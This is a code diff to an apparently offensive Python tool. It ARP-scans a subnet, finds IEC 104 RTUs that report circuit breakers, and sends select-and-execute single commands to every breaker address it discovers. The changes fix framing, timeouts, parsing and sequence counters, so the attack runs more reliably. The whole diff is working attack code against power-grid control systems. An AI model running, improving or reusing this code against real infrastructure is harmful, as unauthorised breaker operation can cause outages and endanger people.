@@ -15,10 +15,10 @@ from threading import Thread
 from socket import socket, AF_INET, SOCK_STREAM, IPPROTO_TCP, SHUT_RDWR
 from time import sleep
 from inquirer import list_input
-from netifaces import AF_INET, ifaddresses, interfaces
+from netifaces import AF_INET as INET, AF_LINK, ifaddresses, interfaces
 from random import randint
-from scapy.sendrecv import sr1, sr
-from scapy.layers.l2 import ARP
+from scapy.sendrecv import srp1, sr1, sr
+from scapy.layers.l2 import ARP, Ether
 from scapy.layers.inet import IP, TCP
 from ipaddress import ip_network, IPv4Address, IPv4Network, IPv6Network
 from typing import Union
@@ -33,7 +33,7 @@ def arpscan(hosts: list[IPv4Address]):
     for host in hosts:
         if str(host) != address['addr']:
             print('[-] Trying {0:s} ...\r'.format(str(host)), end='')
-            response = sr1(ARP(op=0x1, psrc=address['addr'], pdst=str(host)), retry=0, timeout=1, verbose=0)
+            response = srp1(Ether(src=address['mac'], dst='ff:ff:ff:ff:ff:ff', type=0x0806)/ARP(op=0x1, psrc=address['addr'], pdst=str(host)), iface=address['iface'], retry=0, timeout=0.33, verbose=0)
             if response is not None and response.haslayer('ARP') and response['ARP'].op == 0x2:
                 print('   [!] {0:s} is alive'.format(str(host)))
                 alive.append(str(host))
@@ -44,14 +44,11 @@ def handle_rtu(sock: socket, ipaddr: str):
     global rtu_hasbreakers
     buffer : bytes
     sock.connect((ipaddr, IEC104_PORT))
-    sock.settimeout(1)
+    sock.settimeout(10)
     # Start data transmission
     apdu : APDU = APDU()/APCI(type=0x03, UType=0x01)
     buffer = apdu.build()
     sock.send(buffer)
-    if ipaddr not in rtu_data.keys():
-        rtu_data[ipaddr] = dict()
-        rtu_data[ipaddr]['ioas'] = dict()
     while not rtu_thread_killswitch[ipaddr]:
         try:
             buffer = sock.recv(MAX_LENGTH)
@@ -62,7 +59,6 @@ def handle_rtu(sock: socket, ipaddr: str):
             assert apci.type == 0x00
             if 'ca' not in rtu_data[ipaddr].keys():
                 rtu_data[ipaddr]['ca'] = asdu.CommonAddress
-            rtu_data[ipaddr]['tx'] = apci.Rx
             rtu_data[ipaddr]['rx'] = apci.Tx
             if asdu.type in [0x01, 0x02, 0x03, 0x04, 0x1E, 0x1F]:
                 if ipaddr not in rtu_hasbreakers.keys():
@@ -70,11 +66,11 @@ def handle_rtu(sock: socket, ipaddr: str):
                     rtu_hasbreakers[ipaddr]['ioas'] = list()
                     print('   [!] RTU in {0:s} has breakers'.format(ipaddr))
                 io = asdu.IO
-                ioa = io.IOA
+                ioa = io[0].IOA if isinstance(io, list) else io.IOA
                 if asdu.type in [0x01, 0x02, 0x1E]:
-                    values = io.SIQ
+                    values = [x.SIQ for x in io] if isinstance(io, list) else io.SIQ
                 else:
-                    values = io.DIQ
+                    values = [x.DIQ for x in io] if isinstance(io, list) else io.DIQ
                 values = list([values]) if not isinstance(values, list) else values
                 for x in [y for y  in range(ioa, ioa + len(values)) if y not in rtu_hasbreakers[ipaddr]['ioas']]:
                     rtu_hasbreakers[ipaddr]['ioas'].append(x)
@@ -83,7 +79,6 @@ def handle_rtu(sock: socket, ipaddr: str):
             pass
 
 def main():
-    # globals
     global address
     global alive
     global rtu_comm
@@ -94,16 +89,18 @@ def main():
     buffer : bytes
     iface : str = list_input(
         'Choose an interface ',
-        choices=[f'{x:s} ({ifaddresses(x)[AF_INET][0]["addr"]:s})' for x in interfaces() if AF_INET in ifaddresses(x)]
+        choices=[f'{x:s} ({ifaddresses(x)[INET][0]["addr"]:s})' for x in interfaces() if INET in ifaddresses(x)]
     )
     iface = iface.split(' ')[0]
     print('[+] Using ' + str(iface))
-    address : dict[str, str] = ifaddresses(iface)[AF_INET][0]
+    address = ifaddresses(iface)[INET][0]
+    address['mac'] = ifaddresses(iface)[AF_LINK][0]['addr']
+    address['iface'] = iface
     subnet : Union[IPv4Network, IPv6Network] = ip_network(address['addr'] + '/' + address['netmask'], strict=False)
     assert isinstance(subnet, IPv4Network)
     nethosts : list[IPv4Address] = list(subnet.hosts())
     print('[+] Searching for live hosts in {0:s} ...'.format(str(subnet)))
-    alive : list[str] = list()
+    alive = list()
     arpscan_threads : list[Thread] = []
     for hosts in [nethosts[i:i + 16] for i in range(0, len(nethosts), 16)]:
         t = Thread(target=arpscan, kwargs={'hosts': hosts})
@@ -136,16 +133,21 @@ def main():
             elif response.haslayer('ICMP') and response['ICMP'].type == 3 and response['ICMP'].code in [1, 2, 3, 9, 10, 13]:
                 # Filtered
                 pass
-    print('[+] Scanning complete !' + ' '*20)
+    print('[+] Scanning complete !' + ' ' * 20)
     print('[+] Probing RTUs ...')
-    rtu_comm : dict[str, socket] = dict()
-    rtu_data : dict[str, dict] = dict()
-    rtu_threads : dict[str, Thread] = dict()
-    rtu_thread_killswitch : dict[str, bool] = dict()
-    rtu_hasbreakers : dict[str, dict[str, list[int]]] = dict()
+    rtu_comm = dict()
+    rtu_data = dict()
+    rtu_threads = dict()
+    rtu_thread_killswitch = dict()
+    rtu_hasbreakers = dict()
     for rtu_ip in rtus:
         sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
         rtu_comm[rtu_ip] = sock
+        if rtu_ip not in rtu_data.keys():
+            rtu_data[rtu_ip] = dict()
+            rtu_data[rtu_ip]['ioas'] = dict()
+        rtu_data[rtu_ip]['tx'] = 0
+        rtu_data[rtu_ip]['rx'] = 0
         rtu_threads[rtu_ip] = Thread(target=handle_rtu, kwargs={'sock': sock, 'ipaddr': rtu_ip})
         rtu_thread_killswitch[rtu_ip] = False
         rtu_threads[rtu_ip].start()
@@ -163,30 +165,31 @@ def main():
             apdu /= ASDU(type=0x2d, VSQ=VSQ(SQ=0, number=1), CommonAddress=rtu_data[rtu_ip]['ca'], IO=io)
             buffer = apdu.build()
             rtu_comm[rtu_ip].send(buffer)
-            buffer = rtu_comm[rtu_ip].recv(MAX_LENGTH)
-            apdu = APDU(buffer)
+            sleep(2)
             # EXECUTE
-            rtu_data[rtu_ip]['rx'] = apdu['APCI'].Tx
-            rtu_data[rtu_ip]['tx'] = apdu['APCI'].Rx + 1
+            rtu_data[rtu_ip]['tx'] += 1
             apdu = APDU()
             apdu /= APCI(type=0x00, Tx=rtu_data[rtu_ip]['tx'], Rx=rtu_data[rtu_ip]['rx'])
             io = IO45(_sq=0, _balanced=False, IOA=ioa, SE=0b0, SCS=0)
             apdu /= ASDU(type=0x2d, VSQ=VSQ(SQ=0, number=1), CommonAddress=rtu_data[rtu_ip]['ca'], IO=io)
             buffer = apdu.build()
             rtu_comm[rtu_ip].send(buffer)
-            buffer = rtu_comm[rtu_ip].recv(MAX_LENGTH)
             sleep(2)
     print('[+] Done!')
     print('[+] Closing connections ...')
     for rtu_ip in rtus:
         rtu_thread_killswitch[rtu_ip] = True
         rtu_threads[rtu_ip].join()
-        # Stop data transmission
-        apdu : APDU = APDU()/APCI(type=0x03, UType=0x04)
-        buffer = apdu.build()
-        rtu_comm[rtu_ip].send(buffer)
-        buffer = rtu_comm[rtu_ip].recv(MAX_LENGTH)
-        apdu = APDU(buffer)
+        try:
+            # Stop data transmission
+            apdu : APDU = APDU()/APCI(type=0x03, UType=0x04)
+            buffer = apdu.build()
+            rtu_comm[rtu_ip].send(buffer)
+            sleep(0.2)
+            buffer = rtu_comm[rtu_ip].recv(MAX_LENGTH)
+            apdu = APDU(buffer)
+        except TimeoutError:
+            pass
         rtu_comm[rtu_ip].shutdown(SHUT_RDWR)
         rtu_comm[rtu_ip].close()
     print('[+] Bye!')
@@ -194,6 +197,14 @@ def main():
 if __name__ == '__main__':
     from sys import stderr
     try:
+        # globals
+        global address
+        global alive
+        global rtu_comm
+        global rtu_data
+        global rtu_threads
+        global rtu_thread_killswitch
+        global rtu_hasbreakers
         main()
     except AssertionError as e:
         stderr.write(f'{str(e)}\n')
